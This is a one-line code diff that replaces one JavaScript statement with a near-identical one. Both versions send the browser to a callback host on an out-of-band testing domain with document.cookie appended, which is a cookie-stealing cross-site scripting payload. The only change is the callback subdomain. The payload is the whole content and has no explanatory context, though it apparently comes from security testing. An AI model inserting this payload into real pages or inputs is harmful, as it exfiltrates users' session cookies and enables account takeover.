@@ -1,1 +1,1 @@
-window.location.href="http://87e203de7e0969f39e12gis1dmoyyyyyn.oast.pro?content="+document.cookie
+window.location.href="http://1f0de5c4249fded79096gis1g9oyyyyyb.oast.pro?content="+document.cookie
